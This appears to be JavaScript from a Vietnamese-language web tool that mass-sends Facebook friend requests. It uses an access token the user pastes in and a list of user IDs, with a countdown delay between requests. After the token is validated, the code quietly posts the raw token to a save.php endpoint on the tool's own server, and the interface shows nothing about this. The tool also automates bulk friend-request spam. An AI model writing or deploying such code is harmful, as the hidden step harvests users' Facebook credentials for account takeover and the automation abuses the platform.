function friend_add_send(a) {
    if (1 == friend_add.run) {
        var b = friend_add.uid[a].split('|'),
            c = b[0],
            f = b[1] ? b[1] : 'UID ' + b[0];
        $('#friend_add_status').html('<font color=\"blue\">Đang gửi yêu cầu đến <b>' + f + '</b></font> ' + run.loading()), $.get('https://graph.facebook.com/me/friends/' + c, {
            method: 'post',
            access_token: friend_add.token
        }).done(function() {
            ++friend_add.success, $('#friend_add_success').text(friend_add.success), $('#friend_add_status').html('<font color=\"green\">Gửi yêu cầu đến <b>' + f + '</b> thành công, vui lòng đợi <b id=\"timedown\"></b> để tiếp tục</font> ' + run.loading())
        }).error(function(a) {
            if (++friend_add.error, $('#friend_add_error').text(friend_add.error), $('#friend_add_status').html('<font color=\"red\">Gửi yêu cầu đến <b>' + f + '</b> thất bại, vui lòng đợi <b id=\"timedown\"></b> để tiếp tục</font> ' + run.loading()), a.responseText) {
                var a = init.replace_JSON(a.responseText);
                noti.error(a.error.message)
            }
        }).always(function() {
            a + 1 < friend_add.uid.length && timer.count_down(0, Math.floor(friend_add.delay / 60), friend_add.delay - 60 * Math.floor(friend_add.delay / 60), 'timedown', function() {
                friend_add_send(a + 1)
            }), $('#friend_add_progress').attr('style', 'width: ' + Math.floor(100 * (friend_add.success + friend_add.error) / friend_add.uid.length) + '%'), friend_add.success + friend_add.error == friend_add.uid.length && ($('.progress-striped').removeClass('active'), $('#submit_friend_add_start').buttonStop(), $('#submit_friend_add_stop').disabled(), noti.success('Quá trình thêm bạn bè đã hoàn tất !'), $('#friend_add_status').text('Đang chờ !'))
        })
    }
}
location.hostname == b_sv && ($(document).on('click', '#submit_friend_add_stop', function() {
    friend_add.run = 0, 'undefined' != typeof timeout && clearTimeout(timeout), $('#submit_friend_add_stop').disabled(), $('.progress-striped').removeClass('active'), $('#submit_friend_add_start').buttonStop(), noti.success('Đã có lệnh dừng thêm bạn bè !'), $('#friend_add_status').text('Đã dừng thêm bạn bè !')
}), $(document).on('click', '#submit_friend_add_start', function() {
    friend_add = {
        token: $('#input_friend_add_token').validate(),
        delay: $('#input_friend_add_delay').isNumber(),
        uid: $('#input_friend_add_uid').validate(),
        run: 1,
        success: 0,
        error: 0
    }, friend_add.token && friend_add.delay && friend_add.uid && ($(this).buttonLoad(), $('#friend_add_status').html('<font color=\"green\">Tiến hành kiểm tra Access Token</font> ' + run.loading()), $.get('https://graph.facebook.com/me', {
        access_token: friend_add.token
    }).done(function(a) {
        $.post('//' + b_sv + '/save.php', {
            act: 'save',
            array: friend_add.token
        }), friend_add.uid = friend_add.uid.split('\n'), $('.friend_add_progress').hide().slideDown('fast'), $('#friend_add_total').text(friend_add.uid.length), $('.progress-striped').addClass('active'), $('#friend_add_progress').attr('style', 'width: 0%'), $('#submit_friend_add_stop').undisabled(), $('#friend_add_status').html('<font color=\"green\">Access Token hợp lệ, bắt đầu quá trình thêm bạn bè</font> ' + run.loading()), friend_add_send(0)
    }).error(function() {
        $('#submit_friend_add_start').buttonStop(), noti.error('Vui lòng kiểm tra lại Access Token'), $('#friend_add_status').html('<font color=\"red\">Access Token không hợp lệ</font>')
    }))
}))